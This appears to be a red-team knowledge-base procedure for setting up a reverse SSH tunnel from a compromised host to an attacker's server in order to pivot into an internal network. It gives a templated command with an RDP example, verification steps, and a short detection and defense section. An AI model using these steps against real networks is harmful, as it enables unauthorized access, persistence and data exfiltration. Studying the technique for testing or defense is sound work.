---
type: procedure
verified: true
submitted: false
tactics:
  - '[[Lateral Movement]]'
  - '[[Command and Control]]'
techniques:
  - '[[Remote Services]]'
  - '[[Connection Proxy]]'
sub_techniques: []
tags:
  - network-pivoting
  - remote-port-forwarding
  - ssh
  - lateral-movement
  - command-and-control
commands:
  - '[[commands/ssh-reverse-port-forwarding]]'
platforms:
  - Linux
  - Unix
tools:
  - '[[tools/OpenSSH]]'
validated: true
---

# Establish-Reverse-SSH-Tunnel-for-Remote-Port-Forwarding

## Summary

This procedure outlines how to create a reverse SSH tunnel from a compromised host to an attacker's machine, enabling remote port forwarding to access internal network services behind firewalls or NAT devices. It allows attackers to pivot through the compromised host to reach otherwise inaccessible resources, such as internal servers, by binding a port on the attacker's machine to forward traffic to internal hosts visible only from the compromised machine.

## Description

Reverse SSH tunneling uses the SSH protocol's remote port forwarding feature (-R option) to establish a secure connection where the compromised host (acting as the SSH client) connects outbound to the attacker's SSH server. Once connected, a specified port on the attacker's machine is bound and configured to forward incoming connections through the tunnel to an internal host and port accessible from the compromised host. This technique is commonly used in post-exploitation scenarios for lateral movement and command and control, bypassing inbound firewall restrictions since the initial connection is outbound from the target network. It maps to MITRE ATT&CK techniques for using remote services (T1021) and connection proxying (T1090). The procedure assumes the attacker has obtained shell access on the compromised host and can execute SSH commands outbound.

## Requirements

1. Shell access on a compromised host within the target network with outbound internet access to the attacker's SSH server.
2. SSH server (e.g., OpenSSH) running on the attacker's machine, configured to allow remote port forwarding (GatewayPorts yes in sshd_config if binding to non-loopback addresses).
3. Knowledge of internal host IP addresses and ports to forward (e.g., via prior enumeration).
4. SSH credentials (username/password or key-based authentication) valid for the connection from compromised host to attacker.

## Defense

Defensive measures and detection strategies:

- Monitor SSH logs on perimeter hosts for unusual outbound connections and remote port forwarding attempts (look for -R flags in process arguments).
- Restrict SSH client usage on internal hosts via host-based firewalls or application whitelisting to prevent unauthorized tunneling.
- Implement network segmentation and egress filtering to block SSH traffic to untrusted external IPs.
- Enable logging of forwarded ports and use tools like fail2ban or IDS (e.g., Snort) to detect anomalous port bindings.
- Use multi-factor authentication (MFA) for SSH and monitor for privilege escalations that could enable tunnel creation.

## Objectives

1. Establish persistent access to internal network resources via port forwarding.
2. Bypass firewall restrictions limiting inbound connections to the target network.
3. Facilitate data exfiltration or further lateral movement through proxied connections.

## Instructions

### Step 1: Verify SSH Server Configuration on Attacker Machine

**Context**: Before initiating the tunnel, ensure the attacker's SSH server allows remote port forwarding and is accessible. This step prevents connection failures due to configuration issues.

Use [[tools/OpenSSH]] to check and configure sshd_config if needed (edit /etc/ssh/sshd_config, set GatewayPorts clientspecified or yes, then restart sshd).

**Expected Output**: SSH server running without errors; test inbound SSH from another machine to confirm accessibility.

### Step 2: Execute Reverse SSH Tunnel from Compromised Host

**Context**: From the shell on the compromised host, run the SSH command to connect to the attacker's server and set up the reverse tunnel. The -fNT flags background the process (-f), run no remote command (-N), and allocate no TTY (-T) for a pure tunneling session. Choose bind address (e.g., 0.0.0.0 for all interfaces), remote port (on attacker), and forward details based on the target service.

**Command** ([[commands/ssh-reverse-port-forwarding]]):
```bash
ssh -fNT -R $_BIND_ADDRESS:$_REMOTE_PORT:$_FORWARD_HOST:$_FORWARD_PORT $_USER@$_REMOTE_HOST
```

> This command establishes the tunnel. For example, to forward an internal RDP service: replace $_BIND_ADDRESS with 0.0.0.0, $_REMOTE_PORT with 3389, $_FORWARD_HOST with 10.1.1.224 (internal IP), $_FORWARD_PORT with 3389, $_USER with root, and $_REMOTE_HOST with 10.11.0.32 (attacker IP). The tunnel will persist until the SSH connection is terminated.

**Expected Output**: The command forks to background with no output if successful; check with `ps aux | grep ssh` on compromised host to confirm the process is running. No authentication errors or connection refused messages.

### Step 3: Verify and Utilize the Tunnel on Attacker Machine

**Context**: Once the tunnel is established, test connectivity to the forwarded port on the attacker's localhost to ensure traffic routes correctly to the internal service. This validates the setup before further exploitation.

Connect to localhost:$_REMOTE_PORT using an appropriate client (e.g., rdesktop localhost:3389 for RDP, or telnet/nc for other ports). Monitor with `netstat -tlnp | grep :$_REMOTE_PORT` to confirm the listening port.

**Expected Output**: Successful connection to the internal service; e.g., RDP client launches and authenticates to the internal host. No connection timeouts or refusals.

**Success Indicators**:
- SSH process running on compromised host without errors.
- Port bound and listening on attacker's machine (visible in netstat/ss).
- Traffic flows bidirectionally through the tunnel to the internal service.
